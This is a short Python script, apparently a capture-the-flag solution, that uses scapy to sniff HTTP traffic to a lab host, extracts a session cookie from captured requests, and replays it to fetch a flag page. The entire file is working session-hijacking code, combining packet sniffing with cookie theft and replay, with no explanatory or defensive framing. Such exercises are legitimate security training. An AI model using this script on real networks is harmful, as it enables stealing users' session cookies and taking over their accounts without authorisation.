import  requests
import  sys
from scapy.all import *
from scapy.layers.http import HTTPRequest

URL = "http://10.0.0.2/flag"

def get_flag(cookie):
    session_val = cookie[cookie.find('=') + 1:]
    cookie_val = {"session":session_val}
    req = requests.get(URL, cookies=cookie_val)
    flag = req.text[req.text.find("pwn"):]
    print(flag)

def process_packet(packet):
    try:
        req = packet[HTTPRequest]
        if req.Cookie:
            cookie = req.Cookie
            print(cookie)
            get_flag(cookie.decode())
            sys.exit(0)
    except Exception:
        pass

def sniff_packet():
    sniff(filter="host 10.0.0.2", prn=process_packet, count=-1)

if __name__ == "__main__":
    sniff_packet()